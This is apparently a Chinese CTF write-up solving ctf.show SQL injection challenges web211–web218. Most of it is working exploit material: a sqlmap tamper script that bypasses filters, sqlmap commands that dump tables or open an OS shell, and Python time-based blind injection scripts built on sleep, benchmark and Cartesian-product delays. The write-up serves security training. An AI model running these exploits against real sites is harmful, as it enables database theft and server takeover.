<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习，解码和字符过滤一起来    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://7c37ec3d-adf8-4cb7-b8cc-d79be416452b.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://7c37ec3d-adf8-4cb7-b8cc-d79be416452b.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump</span><br></pre></td></tr></table></figure>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习，和上一题没差，增加的过滤不影响 tamper    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://78ef7e34-5843-4584-b7dd-d16f0dde210f.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://78ef7e34-5843-4584-b7dd-d16f0dde210f.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump</span><br></pre></td></tr></table></figure>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习，和上一题完全一样，但 flag 不在表里。题目也提示使用 –os-shell 来 getshell。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://c4548dab-7ead-4a80-a384-31f72836e279.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show --safe-url=<span class="string">&quot;http://c4548dab-7ead-4a80-a384-31f72836e279.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=web211 --os-shell</span><br><span class="line">os-shell&gt; <span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></table></figure>
<p>在根目录找到 flag。    </p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>时间盲注，题目提示是时间盲注，这次没给查询语句和返回逻辑。index.php 请求的时候有一个 /api 的请求但 response 没有内容，试着在 ip 处填写 <code>if(1,sleep(5),0)</code> 请求成功延时了 5 秒，确定注入点。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d3ae60d0-2e14-4022-a741-a5792e99ae19.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 库名 informbtion_schema,test,mysql,performance_schema,czfshow_web</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagx,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flaga,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用了单引号</span></span><br></pre></td></tr></table></figure>
<p>时间盲注，查询语句提示用了单引号，其他提示依旧没有。尝试 <code>111&#39; or if(1,sleep(5),1) #</code>，成功延时。尝试之前的查库名 payload 也能延时，证明语句执行了没有被过滤。<br>写脚本在跑 flag 的时候，跑了几次都出不来，后来发现是列名有问题，加长了延时后结果才是对的，网络环境对时间盲注的影响不容小觑。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://08a214e9-f2ea-4fce-9da4-2415fbf3e37f.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,cthshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;111&#x27; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaa,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;111&#x27; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;111&#x27; or if(ascii(mid((select flagaa from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id = <span class="title function_ invoke__">from_base64</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
<p>时间盲注，查询语句给了一个 from_base64 的操作，这里可以在里面 if 也可以在外面 if，214 题的脚本可用。    </p>
<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>时间盲注，查询语句有个括号里外都能 if，返回逻辑部分禁用了 sleep，还可以用 benchmark 和笛卡尔积。<br>没有了 sleep 要注意把控时间，过大的计算量会卡死，导致后面的注入都不能进行，甚至需要重开环境。<br>为了获得比较准确的结果，加了一些 time.sleep(10) 跑了很久，阳寿换 flag 典中典了。。。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8305ab89-65fe-4af7-941d-3edf147d1629.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxccb,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">            time.sleep(<span class="number">10</span>) <span class="comment"># benchmark 跑完大概需要 10s 多，3s 超时后再让它跑 10s，防止阻塞后全部超时影响时间盲注</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>时间盲注，这次 <code>sleep benchmark</code> 都被禁用了，改用笛卡尔积。    </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1601686">https://cloud.tencent.com/developer/article/1601686</a><br>通过采用 1 个表 2 个列，或者 2 个列一个表，等等各种组合找出合适的延时的时间。    </p>
</blockquote>
<p>经过测试，利用 <code>information_schema</code> 中的数据，一个 <code>columns</code> 和两个 <code>tables</code> 的笛卡尔积刚好能延时 6 秒左右，适合构造 payload。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6a887fe9-0d60-463b-825c-6cfccacc07bb.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaac</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span><br><span class="line">              <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

